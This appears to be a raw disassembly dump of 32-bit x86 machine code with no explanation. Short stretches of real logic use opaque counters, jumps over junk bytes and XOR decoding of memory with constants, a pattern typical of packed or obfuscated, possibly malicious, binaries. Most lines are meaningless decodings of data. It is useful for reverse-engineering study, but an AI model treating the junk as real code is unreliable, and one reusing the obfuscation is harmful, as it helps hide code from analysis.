  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43361b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4336ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433673,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xac0626c6
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x4083e4
  40838a:	mov    dh,0x93
  40838c:	cwde   
  40838d:	jo     0x40832d
  40838f:	pusha  
  408390:	sbb    bl,ch
  408392:	or     BYTE PTR [ecx+0x13],cl
  408395:	scas   al,BYTE PTR es:[edi]
  408396:	sub    DWORD PTR [ecx],ebx
  408398:	mov    edi,0x8f22c1b2
  40839d:	jp     0x40836f
  40839f:	jbe    0x40837c
  4083a1:	push   ebp
  4083a2:	lods   al,BYTE PTR ds:[esi]
  4083a3:	js     0x408421
  4083a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083a6:	ds lock xchg ecx,eax
  4083a9:	mov    al,ds:0x507e11eb
  4083ae:	jnp    0x408356
  4083b0:	push   eax
  4083b1:	rcr    DWORD PTR [edx+0x49],1
  4083b4:	sbb    BYTE PTR [ecx+edx*2-0x52],bl
  4083b8:	mov    edi,0x16e665eb
  4083bd:	inc    ebp
  4083be:	pop    ds
  4083bf:	pop    esi
  4083c0:	shl    dh,0x8e
  4083c3:	xchg   dh,bl
  4083c5:	in     al,dx
  4083c6:	mov    ds:0x8dbcb3a6,eax
  4083cb:	(bad)  
  4083cc:	sub    al,0x82
  4083ce:	pop    edi
  4083cf:	jp     0x4083ca
  4083d1:	in     al,0x27
  4083d3:	adc    DWORD PTR [esi+0x2b],edx
  4083d6:	lock repnz fimul WORD PTR [ecx-0x6e]
  4083db:	nop
  4083dc:	mov    bl,0xe1
  4083de:	mov    ecx,0x372fac95
  4083e3:	jnp    0x4083ff
  4083e5:	js     0x4083c5
  4083e7:	or     ebx,ebp
  4083e9:	mov    ebx,0x812d434d
  4083ee:	or     edi,DWORD PTR [eax]
  4083f0:	and    al,0x37
  4083f2:	add    eax,0xfa796298
  4083f7:	add    al,0x55
  4083f9:	mov    ds:0xd4974530,eax
  4083fe:	cli    
  4083ff:	xchg   esi,eax
  408400:	mov    edi,0x753c73c5
  408405:	sbb    eax,0xaaf890e0
  40840a:	pop    esi
  40840b:	and    eax,0x38a742ee
  408410:	adc    esi,esp
  408412:	stos   DWORD PTR es:[edi],eax
  408413:	add    al,0x34
  408415:	fadd   st,st(4)
  408417:	leave  
  408418:	or     eax,0x969231fb
  40841d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40841e:	pop    ebx
  40841f:	lods   eax,DWORD PTR ds:[esi]
  408420:	mov    esi,ds
  408422:	xchg   BYTE PTR [ebp+ebx*4-0x9ddb529],al
  408429:	sbb    dh,BYTE PTR [ebx+0x65]
  40842c:	dec    esi
  40842d:	(bad)  
  40842e:	in     eax,dx
  40842f:	jbe    0x408442
  408431:	sahf   
  408432:	inc    eax
  408433:	js     0x408456
  408435:	icebp  
  408436:	add    al,0x1c
  408438:	ret    
  408439:	adc    DWORD PTR [edi+0x43],esp
  40843c:	in     eax,dx
  40843d:	pop    ecx
  40843e:	sar    BYTE PTR [edx],0xdb
  408441:	cmp    DWORD PTR [esp+ecx*8-0x5e0b2cd3],esi
  408448:	(bad)  
  40844a:	mov    esp,0xb2078fa3
  40844f:	gs add bh,dh
  408452:	jmp    0x408464
  408454:	adc    bh,al
  408456:	into   
  408457:	xor    ebp,DWORD PTR [edi+0x69]
  40845a:	push   ds
  40845b:	(bad)  
  40845c:	stc    
  40845d:	shl    BYTE PTR [eax+0x13],cl
  408460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408461:	cmp    cl,BYTE PTR [ebp-0x31a9b1eb]
  408467:	push   esi
  408468:	(bad)  
  408469:	cmc    
  40846a:	or     al,0x3d
  40846c:	mov    ah,0x28
  40846f:	iret   
  408470:	push   edx
  408471:	sub    eax,0xb7067480
  408476:	pop    esp
  408477:	ja     0x4084b9
  408479:	lods   eax,DWORD PTR ds:[esi]
  40847a:	add    BYTE PTR [edx-0x69],al
  40847d:	imul   eax,DWORD PTR [esi],0x8e3d0442
  408483:	xlat   BYTE PTR ds:[ebx]
  408484:	dec    edi
  408485:	dec    edi
  408486:	shr    BYTE PTR [eax+0x2b],cl
  408489:	mov    dl,0xdf
  40848b:	not    esi
  40848d:	test   bh,0x6f
  408490:	fdivr  QWORD PTR [ecx-0x80]
  408493:	jae    0x40846b
  408495:	xchg   ebx,eax
  408496:	cmp    edx,DWORD PTR [edx-0x78]
  408499:	mov    ds:0x13f21b0,al
  40849e:	xor    al,0xed
  4084a0:	neg    esi
  4084a2:	call   DWORD PTR [ebx-0x5bc28b4]
  4084a8:	(bad)  
  4084a9:	jo     0x408505
  4084ab:	sub    ch,BYTE PTR [edi-0x5be6ec4c]
  4084b1:	xchg   edx,eax
  4084b2:	xor    eax,esi
  4084b4:	sti    
  4084b5:	lahf   
  4084b6:	call   0x1707:0xf489352d
  4084bd:	mov    ds:0xd999f88a,eax
  4084c2:	retf   
  4084c3:	pop    esp
  4084c4:	xchg   ebx,eax
  4084c5:	sub    BYTE PTR ds:0x62ca80cf,0x54
  4084cc:	dec    edx
  4084cd:	shl    BYTE PTR [ebp+edi*4-0x133b2c0e],cl
  4084d4:	das    
  4084d5:	out    dx,eax
  4084d6:	inc    esp
  4084d7:	out    0xec,eax
  4084d9:	xchg   BYTE PTR [esi-0x305f23bb],bl
  4084df:	into   
  4084e0:	repz sub BYTE PTR [ecx+0x6f],bh
  4084e4:	pushf  
  4084e5:	push   esi
  4084e6:	jnp    0x408506
  4084e8:	inc    esi
  4084e9:	push   cs
  4084ea:	or     esi,ebp
  4084ec:	mov    ah,0xc9
  4084ee:	sub    DWORD PTR [esi],ecx
  4084f0:	out    0xc9,al
  4084f2:	(bad)  
  4084f3:	je     0x408e47
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43372f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43372f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43372f,edx
  408521:	cmp    DWORD PTR ds:0x43372f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43372f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433767
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433617,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433673
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4336bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4336bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4336bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4336bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4336bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	imul   ebp,DWORD PTR [eax-0x2d13f585],0x7e
  4085e4:	jle    0x4085ca
  4085e6:	jg     0x408666
  4085e8:	jle    0x40862b
  4085ea:	cmc    
  4085eb:	inc    edx
  4085ec:	(bad)  
  4085ed:	movaps XMMWORD PTR [ecx+0x19c7e2a],xmm4
  4085f4:	mov    al,0x64
  4085f6:	mov    al,0xb7
  4085f8:	inc    esp
  4085f9:	popa   
  4085fa:	retf   0x2a32
  4085fd:	mov    bl,0x5e
  4085ff:	and    DWORD PTR [esi+0x2344618a],eax
  408605:	pop    edi
  408606:	clc    
  408607:	cmp    edx,edi
  408609:	or     al,0xae
  40860b:	or     ecx,esp
  40860d:	cmp    al,0x50
  40860f:	jbe    0x4085c9
  408611:	push   edx
  408612:	sbb    ecx,eax
  408614:	jnp    0x40863e
  408616:	fild   DWORD PTR [edi-0x34]
  408619:	icebp  
  40861a:	ficom  DWORD PTR [eax-0x6bdf59bc]
  408620:	mov    bh,0x40
  408622:	mov    esi,DWORD PTR [eax]
  408624:	jae    0x408695
  408626:	pop    edi
  408627:	stos   BYTE PTR es:[edi],al
  408628:	mov    al,0x54
  40862a:	or     al,0x62
  40862c:	mov    cl,0x3a
  40862e:	addr16 add al,0x7a
  408631:	rol    BYTE PTR ds:0x84b1d6df,0xab
  408638:	ret    0xfde8
  40863b:	mov    bh,0x35
  40863d:	(bad)  
  40863e:	mov    ebp,0x7669a107
  408643:	push   ebx
  408644:	jp     0x408665
  408646:	test   eax,0x977edd4b
  40864b:	scas   al,BYTE PTR es:[edi]
  40864c:	mul    BYTE PTR [ebx-0x5a24e72f]
  408652:	shl    BYTE PTR [ebp+0x5ff175fe],1
  408658:	je     0x4086bb
  40865a:	push   edx
  40865b:	pop    ds
  40865c:	xchg   BYTE PTR [eax+0x46],dl
  40865f:	xor    cl,al
  408661:	fnstsw WORD PTR [edi+0x19]
  408664:	jg     0x4085fe
  408666:	in     al,dx
  408667:	push   es
  408668:	and    DWORD PTR [ebp-0x7d3f1668],ecx
  40866e:	mov    ebp,0xd3764d1e
  408673:	adc    esi,DWORD PTR [eax-0x1b]
  408676:	or     BYTE PTR [ebp+0x5cdf4822],dl
  40867c:	and    eax,DWORD PTR [eax]
  40867e:	add    eax,0xf944f0ab
  408683:	or     bh,0xaa
  408686:	dec    ebx
  408687:	loop   0x40862a
  408689:	mul    DWORD PTR [edx]
  40868b:	and    ecx,edx
  40868d:	sahf   
  40868e:	arpl   ax,dx
  408690:	sub    al,0xa
  408692:	shl    bh,cl
  408694:	mov    esp,0xcd43ca95
  408699:	inc    edx
  40869a:	inc    ecx
  40869b:	and    al,0xf3
  40869d:	or     eax,0x3677c7b4
  4086a2:	in     al,dx
  4086a3:	jmp    0x29b9:0x71d2f481
  4086aa:	loop   0x408715
  4086ac:	pop    edx
  4086ad:	or     DWORD PTR [edx+0x1b],edx
  4086b0:	dec    eax
  4086b1:	(bad)  
  4086b2:	pop    edx
  4086b3:	stos   BYTE PTR es:[edi],al
  4086b4:	and    ax,0xc713
  4086b8:	fs push cs
  4086ba:	dec    edi
  4086bb:	jo     0x408704
  4086bd:	xchg   DWORD PTR [esi-0x2e],esi
  4086c0:	popf   
  4086c1:	xchg   esp,eax
  4086c2:	inc    esp
  4086c3:	paddq  mm7,QWORD PTR [edi+0x3cc57d14]
  4086ca:	loop   0x408725
  4086cc:	mov    bh,0x3b
  4086ce:	jp     0x4086ae
  4086d0:	and    eax,0x837482a8
  4086d5:	mov    ?,ebp
  4086d7:	lds    eax,FWORD PTR [ecx-0x7f]
  4086da:	mov    eax,0x62388a91
  4086df:	mov    WORD PTR [edx-0x2fea3ce8],es
  4086e5:	and    cl,al
  4086e7:	ins    DWORD PTR es:[edi],dx
  4086e8:	sbb    DWORD PTR [edi-0x48],edx
  4086eb:	xchg   BYTE PTR [edi-0x25],bh
  4086ee:	lods   al,BYTE PTR ds:[esi]
  4086ef:	sti    
  4086f0:	xchg   edx,eax
  4086f1:	in     eax,dx
  4086f2:	jle    0x4086d1
  4086f4:	popa   
  4086f5:	xchg   ebp,eax
  4086f6:	mov    esi,0x43cc0e8d
  4086fb:	pop    ebp
  4086fc:	lods   al,BYTE PTR ds:[esi]
  4086fd:	ins    BYTE PTR es:[edi],dx
  4086fe:	pop    ds
  4086ff:	ins    DWORD PTR es:[edi],dx
  408700:	xor    al,0x3a
  408702:	jg     0x4086aa
  408704:	jle    0x408724
  408706:	jae    0x40871b
  408708:	inc    ebp
  408709:	sbb    eax,DWORD PTR [edx+0x71c7f9bf]
  40870f:	or     DWORD PTR [ecx],eax
  408711:	mov    bh,bl
  408713:	aad    0x19
  408715:	add    DWORD PTR [edi],edx
  408717:	inc    ecx
  408718:	and    DWORD PTR [edi-0x3d],ebp
  40871b:	fdiv   DWORD PTR [edi+0x2e]
  40871e:	dec    eax
  40871f:	out    dx,al
  408720:	mov    ds:0x2bc4376e,al
  408725:	adc    esp,DWORD PTR [edx]
  408727:	pop    ebp
  408728:	lods   al,BYTE PTR ds:[esi]
  408729:	cmp    eax,0xff7e1ca5
  40872e:	sub    eax,edx
  408730:	cli    
  408731:	mov    ebp,0x2e7224a7
  408736:	dec    DWORD PTR [esi]
  408738:	xor    eax,0x27012741
  40873d:	cli    
  40873e:	sub    al,0xb0
  408740:	or     ebp,DWORD PTR [edx+0x52f6ddce]
  408746:	adc    edx,0x5673206e
  40874c:	fisttp QWORD PTR [ecx]
  40874e:	cli    
  40874f:	mov    bl,0x4d
  408751:	jmp    0x408765
  408753:	mov    eax,DWORD PTR [ebp-0x8]
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     dh,ch
  40876c:	mov    esp,0xd352ff4a
  408771:	jle    0x4087f1
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	xchg   ebp,eax
  408778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408779:	call   ebx
  40877b:	aam    0x4c
  40877d:	mov    DWORD PTR [eax-0x3c81cfcb],edi
  408783:	fst    QWORD PTR [edx]
  408785:	hlt    
  408786:	xor    al,0x91
  408788:	and    BYTE PTR [eax-0x714c7174],bl
  40878e:	mov    ds:0xf6dfe984,al
  408793:	ds mov al,0xbe
  408796:	cld    
  408797:	add    ch,BYTE PTR [edi-0x1714d61]
  40879d:	jle    0x408741
  40879f:	jae    0x40878c
  4087a1:	pop    ecx
  4087a2:	mov    edx,0x50cc2972
  4087a7:	push   esp
  4087a8:	out    dx,eax
  4087a9:	push   cs
  4087aa:	mov    eax,0x4abf3736
  4087af:	js     0x40881c
  4087b1:	jno    0x4087a0
  4087b3:	stos   BYTE PTR es:[edi],al
  4087b4:	jge    0x408785
  4087b6:	push   cs
  4087b7:	xchg   ecx,eax
  4087b8:	xchg   ecx,eax
  4087b9:	sbb    eax,esi
  4087bb:	cmp    al,0x4f
  4087bd:	push   edi
  4087be:	pop    ss
  4087bf:	fadd   QWORD PTR [edi+0xc]
  4087c2:	pop    es
  4087c3:	inc    ebp
  4087c4:	sti    
  4087c5:	xor    DWORD PTR [ebp-0x4abed14b],0x2d
  4087cc:	jle    0x40877a
  4087ce:	and    edi,DWORD PTR [edx-0x5f2828e]
  4087d4:	jb     0x408781
  4087d6:	fwait
  4087d7:	push   esi
  4087d8:	jecxz  0x4087e6
  4087da:	nop
  4087db:	sbb    al,0xf3
  4087dd:	loopne 0x4087b3
  4087df:	call   0xa915:0x8c8e78a8
  4087e6:	stos   DWORD PTR es:[edi],eax
  4087e7:	dec    edi
  4087e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087e9:	in     al,0xfd
  4087eb:	xlat   BYTE PTR ds:[ebx]
  4087ec:	push   edx
  4087ed:	fist   WORD PTR [esi]
  4087ef:	sbb    DWORD PTR [eax+ebx*4-0x259d1616],0x2b45b56f
  4087fa:	call   0xae01a55c
  4087ff:	bnd jb 0x40881c
  408802:	push   ecx
  408803:	mov    ah,0xf8
  408805:	push   0x32
  408807:	sub    al,0x6c
  408809:	lock icebp 
  40880b:	inc    eax
  40880c:	dec    esi
  40880d:	sbb    al,0x22
  40880f:	and    ch,BYTE PTR [ecx+0x58]
  408812:	addr16 retw 0x203
  408817:	mov    ch,BYTE PTR ds:0x4c19cc35
  40881d:	xchg   ecx,eax
  40881e:	cwde   
  40881f:	xor    bh,BYTE PTR [ebx]
  408821:	and    ebp,DWORD PTR [ebx-0x690db4b7]
  408827:	hlt    
  408828:	in     al,0xee
  40882a:	ret    
  40882b:	and    DWORD PTR [esi],0xffffffde
  40882e:	inc    edi
  40882f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408830:	push   cs
  408831:	shr    bh,0x6c
  408834:	js     0x4087c2
  408836:	pop    ebp
  408837:	inc    esi
  408838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408839:	pusha  
  40883a:	adc    dh,dh
  40883c:	fsubr  DWORD PTR [esi]
  40883e:	mov    ch,0x7b
  408840:	or     eax,0xdd8bccd4
  408845:	(bad)  
  408846:	and    ch,BYTE PTR [ebx-0x4db023b9]
  40884c:	cld    
  40884d:	call   0xb391faff
  408852:	loope  0x40883d
  408854:	icebp  
  408855:	xor    BYTE PTR [esi-0x687642c2],0x11
  40885c:	mov    ebx,0x36b83118
  408861:	mov    ebp,0x3cdbdb8e
  408866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408867:	jmp    0x240:0xd6436e74
  40886e:	and    eax,0x4ad87eb7
  408873:	push   ecx
  408874:	cmp    DWORD PTR [edx-0x6e35ec00],ecx
  40887a:	rcr    BYTE PTR [ebp+0x6db0f043],cl
  408880:	shr    BYTE PTR [edi],0xc6
  408883:	jns    0x4088ec
  408885:	cmp    eax,0x25cb327
  40888a:	xchg   edi,eax
  40888b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40888c:	test   BYTE PTR [eax],al
  40888e:	pop    ss
  40888f:	add    eax,edi
  408891:	sbb    edi,DWORD PTR [eax-0x2]
  408894:	mov    ebp,0xebcf7dd9
  408899:	xchg   esi,eax
  40889a:	cmc    
  40889b:	call   0xc9d7630d
  4088a0:	dec    esp
  4088a1:	lods   eax,DWORD PTR ds:[esi]
  4088a2:	imul   edx,DWORD PTR [eax-0x4e],0x483a33d5
  4088a9:	dec    ebp
  4088aa:	imul   esi,ecx,0x437bb5f1
  4088b0:	pop    edx
  4088b1:	jns    0x4088fa
  4088b3:	lds    edi,FWORD PTR [ecx+ebx*4+0x69]
  4088b7:	js     0x4088cd
  4088b9:	clc    
  4088ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088bb:	xchg   DWORD PTR [edx+ecx*8],ebx
  4088be:	dec    ebx
  4088bf:	inc    ebx
  4088c0:	aas    
  4088c1:	or     bh,BYTE PTR [edx-0x52]
  4088c4:	sub    BYTE PTR [ebx+0x6cbb44f5],ah
  4088ca:	push   eax
  4088cb:	add    al,ch
  4088cd:	and    eax,0x6cb5371f
  4088d2:	pushf  
  4088d3:	xchg   edx,eax
  4088d4:	push   0xfffffff4
  4088d6:	scas   al,BYTE PTR es:[edi]
  4088d7:	fiadd  DWORD PTR [eax-0x3f]
  4088da:	xchg   DWORD PTR [eax+0x288daa16],esi
  4088e0:	mov    al,ds:0xc95b5e5f
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xee12681a
  40893f:	pop    esi
  408940:	dec    esi
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	jge    0x4088ef
  40894b:	loope  0x40891e
  40894d:	pop    ebx
  40894e:	adc    ch,BYTE PTR [ecx]
  408950:	test   eax,0x8644245d
  408955:	jmp    0x5b7c08dd
  40895a:	add    DWORD PTR [ecx+0x2d742624],esi
  408960:	sub    eax,0x24fdf7f0
  408965:	or     edx,DWORD PTR [esi+eax*4+0x16]
  408969:	mov    al,BYTE PTR [edx]
  40896b:	push   ebx
  40896c:	push   esp
  40896d:	mov    ch,0x73
  40896f:	mov    esi,DWORD PTR [ecx]
  408971:	out    0xad,eax
  408973:	int    0x1f
  408975:	xchg   DWORD PTR [eax+0x53],edi
  408978:	(bad)  
  408979:	cmp    al,0x69
  40897b:	push   esp
  40897c:	jae    0x4089e8
  40897e:	sti    
  40897f:	mov    esi,0x36a2b64f
  408985:	das    
  408986:	xchg   esi,eax
  408987:	jns    0x40892e
  408989:	jmp    0x42307098
  40898e:	fild   DWORD PTR [ebx+0x7bd5f3c7]
  408994:	push   cs
  408995:	outs   dx,DWORD PTR ds:[esi]
  408996:	jp     0x4089a6
  408998:	retf   0xbf72
  40899b:	adc    eax,0x8cf631e0
  4089a0:	and    al,0x34
  4089a2:	in     eax,0x9a
  4089a4:	xchg   esi,eax
  4089a5:	fcmovnbe st,st(0)
  4089a7:	pop    ebp
  4089a8:	mov    al,ds:0xacb2aa6a
  4089ad:	fst    QWORD PTR [ebx+0x36db97a9]
  4089b3:	jmp    0x40893c
  4089b5:	pop    eax
  4089b6:	ins    BYTE PTR es:[edi],dx
  4089b7:	fisttp QWORD PTR [eax+0x2e]
  4089ba:	inc    ebx
  4089bb:	mov    DWORD PTR [ecx-0x3f],0x3dfd6787
  4089c2:	pushf  
  4089c3:	inc    esi
  4089c4:	int3   
  4089c5:	adc    al,0x6f
  4089c7:	(bad)  
  4089c8:	daa    
  4089c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089ca:	sub    eax,0xdf35a0af
  4089cf:	pop    edi
  4089d0:	cld    
  4089d1:	lods   eax,DWORD PTR ds:[esi]
  4089d2:	push   esi
  4089d3:	repnz add cl,BYTE PTR [ebp+0x2a741513]
  4089da:	stc    
  4089db:	and    DWORD PTR [eax+0x6a],edx
  4089de:	xchg   ecx,eax
  4089df:	lahf   
  4089e0:	call   0xdabdfba
  4089e5:	add    eax,0x1682f90e
  4089ea:	ror    ebx,1
  4089ec:	enter  0xa20,0x3a
  4089f0:	adc    al,0xd6
  4089f2:	in     al,0xdc
  4089f4:	sti    
  4089f5:	jbe    0x4089e3
  4089f7:	cmp    edi,eax
  4089f9:	rcl    DWORD PTR [ebx+edi*8+0x2684385d],1
  408a00:	mov    al,ds:0x55938cb3
  408a05:	cmp    BYTE PTR [ebp+0x4c],al
  408a08:	mov    cl,0xe6
  408a0a:	mov    esp,0xc67eed1e
  408a0f:	pusha  
  408a10:	adc    DWORD PTR [ecx-0x5bd9a3b0],0xffffff81
  408a17:	inc    ebx
  408a18:	sbb    DWORD PTR [ebx+0x3d],ebx
  408a1b:	ins    BYTE PTR es:[edi],dx
  408a1c:	inc    ebx
  408a1d:	aad    0x6d
  408a1f:	stos   BYTE PTR es:[edi],al
  408a20:	cli    
  408a21:	out    0x55,al
  408a23:	xchg   ecx,eax
  408a24:	fucomp st(3)
  408a26:	in     eax,dx
  408a27:	inc    ecx
  408a28:	(bad)  
  408a29:	fadd   QWORD PTR [eax+edx*4-0x10d21d2b]
  408a30:	call   0x523a8b4f
  408a35:	or     dh,dh
  408a37:	and    DWORD PTR [esi],eax
  408a39:	push   ebx
  408a3a:	outs   dx,DWORD PTR ds:[esi]
  408a3b:	xor    BYTE PTR [ebp+0x72d69dd2],dh
  408a41:	cmp    eax,0xf1b603e5
  408a46:	leave  
  408a47:	outs   dx,DWORD PTR ds:[esi]
  408a48:	mov    eax,ds:0xd853a174
  408a4d:	add    eax,0xe11cf0d5
  408a52:	dec    ebp
  408a53:	lock sub al,BYTE PTR [esi+edx*2]
  408a57:	add    DWORD PTR [ebx],ebp
  408a59:	push   0x4a7be1f7
  408a5e:	jns    0x408a85
  408a60:	xor    eax,0xa6768ab1
  408a65:	xchg   esi,eax
  408a66:	imul   edi,DWORD PTR ds:0x14dcda88,0x6866e653
  408a70:	dec    ecx
  408a71:	mov    al,0xf
  408a73:	call   0x8661b7fc
  408a78:	iret   
  408a79:	sbb    BYTE PTR [ebx+0x146f660b],al
  408a7f:	sub    ebp,DWORD PTR [edi]
  408a81:	mov    al,0xc7
  408a83:	(bad)  
  408a84:	and    eax,0xddf2f689
  408a89:	cld    
  408a8a:	xor    DWORD PTR [eax+0x7ef22e97],esp
  408a90:	dec    ebx
  408a91:	cmp    eax,0x53072b7c
  408a96:	or     DWORD PTR [ecx],ebx
  408a98:	loope  0x408aa9
  408a9a:	jnp    0x408ace
  408a9c:	pushf  
  408a9d:	mov    eax,ds:0xd89e3bd7
  408aa2:	push   edi
  408aa3:	(bad)  
  408aa4:	fnstsw WORD PTR [edx-0x5]
  408aa7:	lds    edx,FWORD PTR [eax+0x34]
  408aaa:	cmp    esp,ebp
  408aac:	lds    esi,FWORD PTR [eax+0x3f]
  408aaf:	std    
  408ab0:	push   eax
  408ab1:	mov    ebx,0x87d8bd5
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	mov    ebx,0xaee937cd
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	icebp  
  408b27:	dec    esp
  408b28:	mov    ecx,fs
  408b2a:	mov    ebp,0x2c4241f6
  408b2f:	lods   eax,DWORD PTR ds:[esi]
  408b30:	pop    ecx
  408b31:	std    
  408b32:	jmp    0x38e83815
  408b37:	cmp    eax,DWORD PTR [ecx-0x2084f87e]
  408b3d:	cmp    BYTE PTR [ebx+0x2e],ch
  408b40:	jno    0x408b18
  408b42:	(bad)  
  408b43:	js     0x408b3b
  408b45:	pop    edx
  408b46:	add    BYTE PTR [esi],cl
  408b48:	data16 sub al,0x38
  408b4b:	cmp    ah,ch
  408b4d:	out    dx,al
  408b4e:	into   
  408b4f:	(bad)  
  408b50:	cdq    
  408b51:	sub    bl,dl
  408b53:	daa    
  408b54:	(bad)  
  408b55:	popf   
  408b56:	sub    ebx,edi
  408b58:	sub    ebp,DWORD PTR ds:0x63a890ec
  408b5e:	das    
  408b5f:	adc    BYTE PTR [ebx-0x47a8f9f3],0x8
  408b66:	sahf   
  408b67:	xchg   ebp,eax
  408b68:	addr16 pop edi
  408b6a:	push   0xa4afba99
  408b6f:	inc    BYTE PTR cs:[edx+ebx*4+0x73c5297e]
  408b77:	cmp    ecx,DWORD PTR [ebx-0x33]
  408b7a:	outs   dx,DWORD PTR ds:[esi]
  408b7b:	loopne 0x408b04
  408b7d:	mov    esp,0x902560af
  408b82:	fbstp  TBYTE PTR [ebx]
  408b84:	(bad)  
  408b85:	xchg   ebp,eax
  408b86:	jl     0x408b77
  408b88:	fcmovb st,st(5)
  408b8a:	xchg   esi,eax
  408b8b:	mov    esi,0x4252ee95
  408b90:	sbb    al,0x22
  408b92:	mov    bh,0xfc
  408b94:	inc    ecx
  408b95:	cs mov edi,0xfc6091d3
  408b9b:	xor    eax,0x9e35a7ee
  408ba0:	arpl   WORD PTR [eax+ebx*2],dx
  408ba3:	mov    BYTE PTR [eax-0x17],al
  408ba6:	mov    ah,0xd5
  408ba8:	jnp    0x408bf4
  408baa:	retf   0x6748
  408bad:	neg    DWORD PTR [edx+0x78]
  408bb0:	test   al,0xf5
